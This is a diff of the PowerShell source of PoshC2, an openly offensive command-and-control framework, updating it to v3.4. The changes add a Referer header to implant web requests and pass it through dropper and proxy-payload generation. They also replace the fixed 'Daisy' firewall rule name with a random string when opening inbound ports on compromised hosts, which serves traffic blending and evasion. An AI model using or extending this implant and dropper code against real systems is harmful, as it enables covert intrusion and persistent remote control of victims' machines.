@@ -49,7 +49,7 @@ function Implant-Handler
     $SocksURLS =  $c2serverresults.SocksURLS
     $Insecure =  $c2serverresults.Insecure
     $useragent =  $c2serverresults.UserAgent
-
+    $Referer =  $c2serverresults.Referer
     $urlstring = $URLS
     $newImplant = $urlstring -split ","
     $newImplantURL = $newImplant[0] -replace '"',''
@@ -124,7 +124,7 @@ $header = '
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v3.3 www.PoshC2.co.uk =============" -ForegroundColor Green
+            Write-Host "============== v3.4 www.PoshC2.co.uk =============" -ForegroundColor Green
             Write-Host ""
             foreach ($implant in $dbresults) 
             { 
@@ -781,9 +781,9 @@ function CreateProxyPayload
         [Parameter(Mandatory=$true)][string]$proxyurl
     )
     if ($Insecure -eq "Yes") {
-        $command = createdropper -enckey $enckey -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -Insecure -useragent $useragent
+        $command = createdropper -enckey $enckey -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -Insecure -useragent $useragent -Referer $Referer
     } else {
-        $command = createdropper -enckey $enckey -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -useragent $useragent
+        $command = createdropper -enckey $enckey -Proxy -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -username $username -password $password -proxyurl $proxyurl -useragent $useragent -Referer $Referer
     }
             
     $payload = createrawpayload -command $command
@@ -807,9 +807,11 @@ param(
 [Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyuser, 
 [Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxypassword)
 
+$firewallName = Get-RandomURI -Length 15
+
 $fw = Read-Host "Do you want to create a firewall rule for this: Y/N"
 if ($fw -eq "Y") {
-    $fwcmd = "Netsh.exe advfirewall firewall add rule name=`"Daisy`" dir=in action=allow protocol=TCP localport=$port enable=yes"
+    $fwcmd = "Netsh.exe advfirewall firewall add rule name=`"$firewallName`" dir=in action=allow protocol=TCP localport=$port enable=yes"
 }
 
 if ($Localhost.IsPresent){
@@ -819,7 +821,7 @@ $daisyserver = "http://localhost"
 $HTTPServer = "+"
 }
 
-$command = createdropper -enckey $enckey -Daisy -killdate $killdatefm -ipv4address $daisyserver -serverport $port 
+$command = createdropper -enckey $enckey -Daisy -killdate $killdatefm -ipv4address $daisyserver -serverport $port -Referer $Referer
 $payload = createrawpayload -command $command
 
 # create proxy payloads
@@ -850,6 +852,7 @@ if (`$k -lt `$d) {exit}
 `$proxyurl = `$proxyurl
 `$wc = New-Object System.Net.WebClient;  
 `$wc.Headers.Add("User-Agent","$useragent")
+`$wc.Headers.Add("Referer","$referer")
 `$h=`$domainfrontheader
 if (`$h) {`$wc.Headers.Add("Host",`$h)}
 if (`$proxyurl) {
@@ -961,7 +964,7 @@ $fwcmd
 `$kill.log = "1"
 function Stop-Daisy {
 `$kill.log = 2
-Netsh.exe advfirewall firewall del rule name=`"Daisy`"
+Netsh.exe advfirewall firewall del rule name=`"$firewallName`"
 (new-object system.net.webclient).downloadstring("http://localhost:$port")
 }
 if (!`$t) { 
